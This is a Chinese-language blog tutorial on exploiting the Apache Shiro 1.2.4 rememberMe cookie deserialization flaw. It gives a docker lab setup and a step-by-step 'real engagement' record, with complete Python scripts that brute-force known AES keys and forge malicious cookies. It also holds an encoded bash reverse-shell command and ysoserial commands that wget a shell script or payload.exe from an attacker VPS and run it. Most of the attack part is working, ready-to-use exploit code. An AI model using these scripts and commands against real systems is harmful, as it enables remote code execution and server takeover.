**目录**

[漏洞描述](#t0 "漏洞描述")

[如何判断网站是否使用Shiro](#t1 "如何判断网站是否使用Shiro")

[shiro反序列化复现](#t2 "shiro反序列化复现")

[环境搭建](#t3 "环境搭建")

[检测目标网站的key值](#t4 "检测目标网站的key值")

[验证是否有漏洞](#%E9%AA%8C%E8%AF%81%E6%98%AF%E5%90%A6%E6%9C%89%E6%BC%8F%E6%B4%9E "验证是否有漏洞")

[反弹shell](#t5 "反弹shell")

[实战记录](#t6 "实战记录")

* * *

漏洞描述
----

[Apache](https://so.csdn.net/so/search?q=Apache&spm=1001.2101.3001.7020) Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。

Apache [Shiro](https://so.csdn.net/so/search?q=Shiro&spm=1001.2101.3001.7020) 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。

**漏洞产生原因：**

shiro默认使用了`CookieRememberMeManager`，其处理cookie的流程是：得到rememberMe的cookie值-->Base64解码-->AES解密-->[反序列化](https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020)。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。

**payload 构造**

恶意命令-->序列化-->AES加密-->base64编码-->发送cookie

在整个漏洞利用过程中，比较重要的是AES加密的密钥，该秘钥默认是默认硬编码的，所以如果没有修改默认的密钥，就自己可以生成恶意构造的cookie了。

**漏洞影响版本**：Apache Shiro <= 1.2.4

**shiro特征：**

*   未登陆的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段
*   登陆失败的话，不管勾选RememberMe字段没有，返回包都会有rememberMe=deleteMe字段
*   不勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe=deleteMe字段。但是之后的所有请求中Cookie都不会有rememberMe字段
*   勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe=deleteMe字段，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段

![](https://img-blog.csdnimg.cn/2019081416401094.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如何判断网站是否使用Shiro
---------------

可以尝试在请求包中的cookie中加入 rememberMe=1 ，来查看返回包是否有rememberMe=deleteMe字段。

![](https://img-blog.csdnimg.cn/20200515181721446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200515181805986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果请求包中没有Cookie字段，我们可以手动加上该字段：Cookie:rememberMe=1

![](https://img-blog.csdnimg.cn/20200620161354258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

shiro反序列化复现
-----------

### 环境搭建

我们这里使用 docker 搭建环境

```
docker pull medicean/vulapps:s_shiro_1      
docker run -d -p 80:8080 medicean/vulapps:s_shiro_1
```


![](https://img-blog.csdnimg.cn/20200502103208430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

启动后，访问环境

![](https://img-blog.csdnimg.cn/2020050210331832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 检测目标网站的key值

首先检测目标网站的rememberMe的key值

在DNSlog平台上申请一个子域名，传送门：[DNSLog Platform](http://www.dnslog.cn/ "DNSLog Platform")

![](https://img-blog.csdnimg.cn/20200502134629288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后执行以下命令使用 shiro\_check\_key.py 检测目标网站的rememberMe的key值

```
python2 shiro_check_key.py http://xx.xx.xx.xx  "c39q1d.dnslog.cn"
```


![](https://img-blog.csdnimg.cn/20200502134724190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

执行完成后，查看DNSLog平台，可以看到key值。

![](https://img-blog.csdnimg.cn/20200502134827650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 验证是否有漏洞

然后再申请一个子域名

![](https://img-blog.csdnimg.cn/20200502110754116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后使用执行以下命令使用 shiro\_poc.py 生成一个 payload.cookie 文件。脚本中的key值根据上面检测的key值来确定

![](https://img-blog.csdnimg.cn/20200502110743149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200502120524299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

访问网站，用正确的用户名密码登陆，记得勾选RememberMe字段

![](https://img-blog.csdnimg.cn/20200502122719635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

登陆成功后，抓包，会发现 Cookie 中有 rememberMe 字段

![](https://img-blog.csdnimg.cn/20200502122825390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

将生成的 payload.cooke 里的内容把Cookie字段全部替换掉。注意：JSESSIONID字段也替换。然后重放

![](https://img-blog.csdnimg.cn/20200502110902482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

DNSlog平台接收到请求，说明存在漏洞

![](https://img-blog.csdnimg.cn/20200502110843255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 反弹shell

这里反弹shell的命令需要进行加密才能执行，加密网站：[java.lang.Runtime.exec() Payload Workarounds - @Jackson\_T](http://www.jackson-t.ca/runtime-exec-payloads.html "java.lang.Runtime.exec() Payload Workarounds - @Jackson_T")

![](https://img-blog.csdnimg.cn/20200502163316529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后重新调用shiro\_poc.py生成rememberMe的值

```
python3 shiro_poc.py "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC81Ny4xMTQuMTM5LjI0OS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}"
```


![](https://img-blog.csdnimg.cn/20200502163353583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

复制生成的rememberMe的值，替换所有的cookie，重放

![](https://img-blog.csdnimg.cn/20200502163546634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

nc监听收到shell

![](https://img-blog.csdnimg.cn/20200502163629725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

注：如果目标服务器是Windows环境的话，则不能一键反弹shell，可以先远程下载木马，然后执行。

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 'wget x.x.x.x/payload.exe -O payload.exe'      
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 './payload.exe'
```


实战记录
----

以下是做项目过程中的实战记录

**环境：**

*   我们的公网VPS：114.118.80.138
*   存在漏洞的网站：http://www.test.com
*   Windows主机

**第一步：**在我们的VPS上搭建一个web服务，该web服务下放一个反弹shell的脚本文件 1.sh，1.sh的内容如下

```
bash -i >& /dev/tcp/114.118.80.138/8888 0>&1       
python -m SimpleHTTPServer 8080
```


![](https://img-blog.csdnimg.cn/20190803230317360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**第二步：**然后在我们的VPS上执行下列命令，意思是下载我们的1.sh,并且重命名为test

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12345  CommonsCollections5 'wget http://114.118.80.138:8080/1.sh -O test'
```


![](https://img-blog.csdnimg.cn/20190803231126943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**第三步：**然后在我们的windows机器上执行shiro\_rce.py脚本，这样，就会在目前机器上下载 [http://114.118.80.138:8080/1.sh](http://114.118.80.138:8080/1.sh "http://114.118.80.138:8080/1.sh") 文件，并且命名为test。

![](https://img-blog.csdnimg.cn/20190803231142496.png)

前面三步的目的是将我们的1.sh脚本下载到目标机器上，并且重命名为test。

**第四步**：我们在VPS上监听8888端口

**第五步：**并且在我们的VPS上运行下面命令，意思是执行目标机器上的刚刚下载的test脚本

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12345  CommonsCollections5 'sh test'
```


**第六步：**然后再次在windows机器上执行shiro\_rce.py脚本，这样，我们nc就可以收到目标机器反弹的shell了。 

![](https://img-blog.csdnimg.cn/20190803231837768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

以下是 shiro\_check\_key.py文件的内容

```
#codeing:utf-8      
# pip install pycrypto      
import sys        
import base64        
import uuid        
from random import Random        
import subprocess        
from Crypto.Cipher import AES      
import requests      1
import time       1
cookies = {}      1
headers = {      1
    'User-Agent': 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',      1
    'Accept-Encoding': 'gzip, deflate',      1
    'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',      1
}       1
def encode_rememberme(command,key):        2
      popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'URLDNS', command], stdout=subprocess.PIPE)      2
      BS   = AES.block_size      2
      pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()      2
      mode =  AES.MODE_CBC      2
      iv   =  uuid.uuid4().bytes      2
      encryptor = AES.new(base64.b64decode(key), mode, iv)      2
      file_body = pad(popen.stdout.read())      2
      base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))      2
      return base64_ciphertext       3
if __name__ == '__main__':      3
      keylist = ['kPH+bIxk5D2deZiIxcaaaA==',      3
      'wGiHplamyXlVB11UXWol8g==',      3
      '2AvVhdsgUs0FSA3SDFAdag==',      3
      '4AvVhmFLUs0KTA3Kprsdag==',      3
      '3AvVhmFLUs0KTA3Kprsdag==',      3
      'Z3VucwAAAAAAAAAAAAAAAA==',      3
      'U3ByaW5nQmxhZGUAAAAAAA==',      3
      'wGiHplamyXlVB11UXWol8g==',      3
      'fCq+/xW488hMTCD+cmJ3aQ==',      4
      '1QWLxg+NYmxraMoxAXu/Iw==',      4
      'ZUdsaGJuSmxibVI2ZHc9PQ==',      4
      'L7RioUULEFhRyxM7a2R/Yg==',      4
      '6ZmI6I2j5Y+R5aSn5ZOlAA==',      4
      'r0e3c16IdVkouZgk1TKVMg==',      4
      '5aaC5qKm5oqA5pyvAAAAAA==',      4
      'bWluZS1hc3NldC1rZXk6QQ==',      4
      'a2VlcE9uR29pbmdBbmRGaQ==',      4
      'WcfHGU25gNnTxTlmJMeSpw==',      4
      'MTIzNDU2Nzg5MGFiY2RlZg==',      5
      '5AvVhmFLUs0KTA3Kprsdag==',      5
      '6ZmI6I2j3Y+R1aSn5BOlAA==',      5
      'SkZpbmFsQmxhZGUAAAAAAA==',      5
      '2cVtiE83c4lIrELJwKGJUw==',      5
      'fsHspZw/92PrS3XrPW+vxw==',      5
      'XTx6CKLo/SdSgub+OPHSrw==',      5
      'sHdIjUN6tzhl8xZMG3ULCQ==',      5
      'O4pdf+7e+mZe8NyxMTPJmQ==',      5
      'f/SY5TIve5WWzT4aQlABJA==',      5
      'HWrBltGvEZc14h9VpMvZWw==',      6
      'rPNqM6uKFCyaL10AK51UkQ==',      6
      'Y1JxNSPXVwMkyvES/kJGeQ==',      6
      'lT2UvDUmQwewm6mMoiw4Ig==',      6
      'MPdCMZ9urzEA50JDlDYYDg==',      6
      'xVmmoltfpb8tTceuT5R7Bw==',      6
      'c+3hFGPjbgzGdrC+MHgoRQ==',      6
      'ClLk69oNcA3m+s0jIMIkpg==',      6
      'Bf7MfkNR0axGGptozrebag==',      6
      '1tC/xrDYs8ey+sa3emtiYw==',      6
      'ZmFsYWRvLnh5ei5zaGlybw==',      7
      'cGhyYWNrY3RmREUhfiMkZA==',      7
      'IduElDUpDDXE677ZkhhKnQ==',      7
      'yeAAo1E8BOeAYfBlm4NG9Q==',      7
      'cGljYXMAAAAAAAAAAAAAAA==',      7
      '2itfW92XazYRi5ltW0M2yA==',      7
      'XgGkgqGqYrix9lI6vxcrRw==',      7
      '25BsmdYwjnfcWmnhAciDDg==',      7
      'ertVhmFLUs0KTA3Kprsdag==',      7
      '5AvVhmFLUS0ATA4Kprsdag==',      7
      's0KTA3mFLUprK4AvVhsdag==',      8
      'hBlzKg78ajaZuTE0VLzDDg==',      8
      '9FvVhtFLUs0KnA3Kprsdyg==',      8
      'd2ViUmVtZW1iZXJNZUtleQ==',      8
      'yNeUgSzL/CfiWw1GALg6Ag==',      8
      'NGk/3cQ6F5/UNPRh8LpMIg==',      8
      '4BvVhmFLUs0KTA3Kprsdag==',      8
      'kPH+bIxk5D2deZiIxcaaaA==',      8
      '4AvVhmFLUs0KTA3Kprsdag==',      8
      'Z3VucwAAAAAAAAAAAAAAAA==',      8
      'fCq+/xW488hMTCD+cmJ3aQ==',      9
      '0AvVhmFLUs0KTA3Kprsdag==',      9
      '1AvVhdsgUs0FSA3SDFAdag==',      9
      '1QWLxg+NYmxraMoxAXu/Iw==',      9
      '25BsmdYwjnfcWmnhAciDDg==',      9
      '2AvVhdsgUs0FSA3SDFAdag==',      9
      '3AvVhmFLUs0KTA3Kprsdag==',      9
      '3JvYhmBLUs0ETA5Kprsdag==',      9
      'r0e3c16IdVkouZgk1TKVMg==',      9
      '5aaC5qKm5oqA5pyvAAAAAA==',      9
      '5AvVhmFLUs0KTA3Kprsdag==',      10
      '6AvVhmFLUs0KTA3Kprsdag==',      10
      '6NfXkC7YVCV5DASIrEm1Rg==',      10
      '6ZmI6I2j5Y+R5aSn5ZOlAA==',      10
      'cmVtZW1iZXJNZQAAAAAAAA==',      10
      '7AvVhmFLUs0KTA3Kprsdag==',      10
      '8AvVhmFLUs0KTA3Kprsdag==',      10
      '8BvVhmFLUs0KTA3Kprsdag==',      10
      '9AvVhmFLUs0KTA3Kprsdag==',      10
      'OUHYQzxQ/W9e/UjiAGu6rg==',      10
      'a3dvbmcAAAAAAAAAAAAAAA==',      11
      'aU1pcmFjbGVpTWlyYWNsZQ==',      11
      'bWljcm9zAAAAAAAAAAAAAA==',      11
      'bWluZS1hc3NldC1rZXk6QQ==',      11
      'bXRvbnMAAAAAAAAAAAAAAA==',      11
      'ZUdsaGJuSmxibVI2ZHc9PQ==',      11
      'wGiHplamyXlVB11UXWol8g==',      11
      'U3ByaW5nQmxhZGUAAAAAAA==',      11
      'MTIzNDU2Nzg5MGFiY2RlZg==',      11
      'L7RioUULEFhRyxM7a2R/Yg==',      11
      'a2VlcE9uR29pbmdBbmRGaQ==',      12
      'WcfHGU25gNnTxTlmJMeSpw==',      12
      'OY//C4rhfwNxCQAQCrQQ1Q==',      12
      '5J7bIJIV0LQSN3c9LPitBQ==',      12
      'f/SY5TIve5WWzT4aQlABJA==',      12
      'bya2HkYo57u6fWh5theAWw==',      12
      'WuB+y2gcHRnY2Lg9+Aqmqg==',      12
      '3qDVdLawoIr1xFd6ietnwg==',      12
      'YI1+nBV//m7ELrIyDHm6DQ==',      12
      '6Zm+6I2j5Y+R5aS+5ZOlAA==',      12
      '2A2V+RFLUs+eTA3Kpr+dag==',      13
      '6ZmI6I2j3Y+R1aSn5BOlAA==',      13
      'SkZpbmFsQmxhZGUAAAAAAA==',      13
      '2cVtiE83c4lIrELJwKGJUw==',      13
      'fsHspZw/92PrS3XrPW+vxw==',      13
      'XTx6CKLo/SdSgub+OPHSrw==',      13
      'sHdIjUN6tzhl8xZMG3ULCQ==',      13
      'O4pdf+7e+mZe8NyxMTPJmQ==',      13
      'HWrBltGvEZc14h9VpMvZWw==',      13
      'rPNqM6uKFCyaL10AK51UkQ==',      13
      'Y1JxNSPXVwMkyvES/kJGeQ==',      14
      'lT2UvDUmQwewm6mMoiw4Ig==',      14
      'MPdCMZ9urzEA50JDlDYYDg==',      14
      'xVmmoltfpb8tTceuT5R7Bw==',      14
      'c+3hFGPjbgzGdrC+MHgoRQ==',      14
      'ClLk69oNcA3m+s0jIMIkpg==',      14
      'Bf7MfkNR0axGGptozrebag==',      14
      '1tC/xrDYs8ey+sa3emtiYw==',      14
      'ZmFsYWRvLnh5ei5zaGlybw==',      14
      'cGhyYWNrY3RmREUhfiMkZA==',      14
      'IduElDUpDDXE677ZkhhKnQ==',      15
      'yeAAo1E8BOeAYfBlm4NG9Q==',      15
      'cGljYXMAAAAAAAAAAAAAAA==',      15
      '2itfW92XazYRi5ltW0M2yA==',      15
      'XgGkgqGqYrix9lI6vxcrRw==',      15
      'ertVhmFLUs0KTA3Kprsdag==',      15
      '5AvVhmFLUS0ATA4Kprsdag==',      15
      's0KTA3mFLUprK4AvVhsdag==',      15
      'hBlzKg78ajaZuTE0VLzDDg==',      15
      '9FvVhtFLUs0KnA3Kprsdyg==',      15
      'd2ViUmVtZW1iZXJNZUtleQ==',      16
      'yNeUgSzL/CfiWw1GALg6Ag==',      16
      'NGk/3cQ6F5/UNPRh8LpMIg==',      16
      '4BvVhmFLUs0KTA3Kprsdag==',      16
      'MzVeSkYyWTI2OFVLZjRzZg==',      16
      'empodDEyMwAAAAAAAAAAAA==',      16
      'A7UzJgh1+EWj5oBFi+mSgw==',      16
      'c2hpcm9fYmF0aXMzMgAAAA==',      16
      'i45FVt72K2kLgvFrJtoZRw==',      16
      'U3BAbW5nQmxhZGUAAAAAAA==',      16
      'ZnJlc2h6Y24xMjM0NTY3OA==',      17
      'Jt3C93kMR9D5e8QzwfsiMw==',      17
      'MTIzNDU2NzgxMjM0NTY3OA==',      17
      'vXP33AonIp9bFwGl7aT7rA==',      17
      'V2hhdCBUaGUgSGVsbAAAAA==',      17
      'Z3h6eWd4enklMjElMjElMjE=',      17
      'Q01TX0JGTFlLRVlfMjAxOQ==',      17
      'ZAvph3dsQs0FSL3SDFAdag==',      17
      'Is9zJ3pzNh2cgTHB4ua3+Q==',      17
      'NsZXjXVklWPZwOfkvk6kUA==',      17
      'GAevYnznvgNCURavBhCr1w==',      18
      '66v1O8keKNV3TTcGPK1wzg==',      18
      'SDKOLKn2J1j/2BHjeZwAoQ==',      18
      'N3ghQSVEKkctSmFOZFJnVQ==']      18
      proxy = {      18
            "http": "http://127.0.0.1:8000",      18
            "https": "https://127.0.0.1:8000",      18
      }      18
      data = '{"domain":"","locale":"en","username":"asdasd","password":"asdsad"}'      18
      for key in keylist:      18
            print("http://"+key.replace('==','').replace('/','')+'.'+sys.argv[2])      19
            cookie = encode_rememberme("http://"+key.replace('==','').replace('/','')+'.'+sys.argv[2],key)      19
            cookies['rememberMe'] = cookie      19
            requests.get(sys.argv[1],headers=headers, cookies=cookies,verify=False,timeout=15)
```


以下是shiro\_poc.py文件的内容 

```
import sys      
import base64      
import uuid      
from random import Random      
import subprocess      
from Crypto.Cipher import AES       
def encode_rememberme(command):      
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'CommonsCollections2', command], stdout=sub      1
process.PIPE)      1
    BS   = AES.block_size      1
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()      1
    key  =  "kPH+bIxk5D2deZiIxcaaaA=="      1
    mode =  AES.MODE_CBC      1
    iv   =  uuid.uuid4().bytes      1
    encryptor = AES.new(base64.b64decode(key), mode, iv)      1
    file_body = pad(popen.stdout.read())      1
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))      1
    return base64_ciphertext       2
if __name__ == '__main__':      2
    payload = encode_rememberme(sys.argv[1])          2
    with open("payload.cookie", "w") as fpw:      2
        print("rememberMe={}".format(payload.decode()), file=fpw)
```


以下是shiro\_rce.py文件的内容：

```
#coding: utf-8      
import os      
import re      
import time      
import base64      
import uuid      
import subprocess      
import requests      
from Crypto.Cipher import AES      1
#JAR_FILE = 'ysoserial-master-SNAPSHOT.jar'      1
JAR_FILE = 'ysoserial-0.0.6-SNAPSHOT-all.jar'      1
keys = ['Z3VucwAAAAAAAAAAAAAAAA==','kPH+bIxk5D2deZiIxcaaaA==','4AvVhmFLUs0KTA3Kprsdag==','3AvVhmFLUs0KTA3Kprsdag==','2AvVhdsgUs0FSA3SDFAdag==','wGiHplamyXlVB11UXWol8g==','fCq+/xW488hMTCD+cmJ3aQ==','1QWLxg+NYmxraMoxAXu/Iw==','ZUdsaGJuSmxibVI2ZHc9PQ==','L7RioUULEFhRyxM7a2R/Yg== ','6ZmI6I2j5Y+R5aSn5ZOlAA==','r0e3c16IdVkouZgk1TKVMg==','ZWvohmPdUsAWT3=KpPqda','5aaC5qKm5oqA5pyvAAAAAA==','bWluZS1hc3NldC1rZXk6QQ==','a2VlcE9uR29pbmdBbmRGaQ==','WcfHGU25gNnTxTlmJMeSpw==','LEGEND-CAMPUS-CIPHERKEY==','3AvVhmFLUs0KTA3Kprsdag==']      1
lis = ["BeanShell1","C3P0","Clojure","CommonsBeanutils1","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","FileUpload1","Groovy1","Hibernate1","Hibernate2","JBossInterceptors1","JRMPClient","JRMPListener","JSON1","JavassistWeld1","Jdk7u21","Jython1","MozillaRhino1","Myfaces1","Myfaces2","ROME","Spring1","Spring2","URLDNS","Wicket1",]      1
#keys = ['4AvVhmFLUs0KTA3Kprsdag==','']      1
def poc(url, rce_command,key,func):      1
    if '://' not in url:      1
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url      1
    else:      1
        target = url      2
    try:      2
        payload = generator(rce_command, JAR_FILE,key,func)  # 生成payload      2
        #print payload      2
        print payload.decode()      2
        #exit()      2
        r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10,verify=False)  # 发送验证请求      2
    except Exception, e:      2
        print(e)      2
        pass      2
    return False      3
def generator(command, fp,aeskey,func):      3
    if not os.path.exists(fp):      3
        raise Exception('jar file not found!')       3
    popen = subprocess.Popen(['java', '-jar', fp,func, command],stdout=subprocess.PIPE)       3
    BS = AES.block_size      3
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()      3
    key = aeskey      3
    mode = AES.MODE_CBC      4
    iv = uuid.uuid4().bytes      4
    encryptor = AES.new(base64.b64decode(key), mode, iv)      4
    file_body = pad(popen.stdout.read())      4
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))      4
    return base64_ciphertext      4
poc('http://www.test.com','114.118.80.138:12345',keys[1],'JRMPClient')   #www.test.com替换成目标主机的链接，114.118.80.138替换成自己VPS的地址
```


注意：windows机器上和VPS机器上均要有ysoserial-0.0.6-SNAPSHOT-all.jar文件，并且windows机器上的ysoserial-0.0.6-SNAPSHOT-all.jar要和shiro\_rce.py文件在同一目录。并且windows机器上还需要装一个pycrypto库包，该库包是Crypto.Cipher的包。

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)